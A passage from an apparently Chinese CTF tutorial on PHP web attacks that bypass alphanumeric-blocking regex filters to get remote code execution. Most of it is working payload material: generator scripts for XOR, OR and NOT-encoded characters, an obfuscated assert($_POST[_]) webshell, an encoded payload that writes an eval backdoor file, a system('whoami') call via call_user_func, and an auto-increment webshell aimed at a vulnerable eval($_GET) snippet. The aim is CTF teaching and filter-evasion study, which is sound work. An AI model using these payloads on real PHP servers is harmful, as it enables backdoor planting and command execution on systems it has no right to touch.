; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))&#124;&#124;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//或</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))&#124;&#124;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)&#124;<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后再将需要的命令拼接出来即可。</p><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">shell=<span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_POST&#x27;</span>;<br><span class="hljs-variable">$___</span>=$<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-regexp">//</span> assert(<span class="hljs-variable">$_POST</span>[_]);<br></code></pre></td></tr></table></figure><p>执行env命令打印环境变量就有flag。</p><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>和异或原理差不多，利用两个字符取反来获取想要的字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果想使用call_user_func的话可以使用下面这段取反：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;call_user_func&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;system&#x27;</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;whoami&#x27;</span>));<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;(~&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&#x27;,~&#x27;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&#x27;,\&#x27;\&#x27;)&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一些常用的取反payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">//写马<br>//file_put_contents(&#x27;<span class="hljs-number">4</span>.php&#x27;<span class="hljs-punctuation">,</span>&#x27;&lt;?php eval(\$_POST[<span class="hljs-number">1</span>])<span class="hljs-comment">;&#x27;);</span><br>(~(<span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%A0</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>A<span class="hljs-variable">%8</span>B<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%8</span>C))(~(<span class="hljs-variable">%CB</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F)<span class="hljs-punctuation">,</span>~(<span class="hljs-variable">%C3</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%DF</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%C4</span>))<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>//命令执行<br>//(call_user_func)(system<span class="hljs-punctuation">,</span>whoami<span class="hljs-punctuation">,</span>&#x27;&#x27;)<br>(~<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%93</span><span class="hljs-variable">%93</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)(~<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span><span class="hljs-punctuation">,</span>~<span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%92</span><span class="hljs-variable">%96</span><span class="hljs-punctuation">,</span>&#x27;&#x27;)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h4 id="自增-有限制"><a href="#自增-有限制" class="headerlink" title="自增(有限制)"></a>自增(有限制)</h4><p>注意是php5环境。</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>来自p牛的经典bypas，使用[]数组获取array中的第一个字符 ‘a’ ，然后通过自增去获取其它字符最终构造出webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// E </span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// R</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// P</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// O</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-comment">// ASSERT($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>连接起来就是</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery">shell=<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;$_&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span 